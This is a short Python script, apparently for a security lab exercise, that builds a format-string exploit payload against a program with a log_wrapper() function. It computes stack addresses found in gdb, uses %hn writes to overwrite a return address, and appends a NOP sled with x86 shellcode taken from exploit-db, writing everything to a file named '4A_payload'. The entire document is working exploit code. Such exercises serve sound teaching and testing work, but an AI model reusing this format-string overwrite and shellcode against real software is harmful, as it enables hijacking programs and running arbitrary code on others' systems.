import struct,sys
offset=int(sys.argv[1])#I found these addrs in gdb, real addr must be different
top_of_stack=0xbffff448-offset
retn=top_of_stack+4
addr_of_shellcode=retn+0x2ff
target=struct.pack("<I",retn) #retn addr of log_wrapper()
target_2=struct.pack("<I",retn+2)
addr_of_shellcode_to_b=struct.pack("<I",addr_of_shellcode)
padding2=struct.unpack("<I",addr_of_shellcode_to_b[0:2]+b"\x00\x00")[0]-0xbfff
padding =struct.unpack("<I",addr_of_shellcode_to_b[2:4]+b"\x00\x00")[0]-121
#https://www.exploit-db.com/shellcodes/49976
shellcode=b"\xd9\xee\x9b\xd9\x74\x24\xf4\x5f\x83\xc7\x25\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x08\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a"
payload =b"A"
payload+=target_2+b"BBBB"+target
payload+=("%p%p%p%p%p%p%p%p%p%p%p%p%{}p%hn%{}p%hn".format(padding,padding2)).encode()
payload+=b"\x90"*400+shellcode+b"\x00"
f=open("4A_payload","wb")
f.write(payload)
f.close()
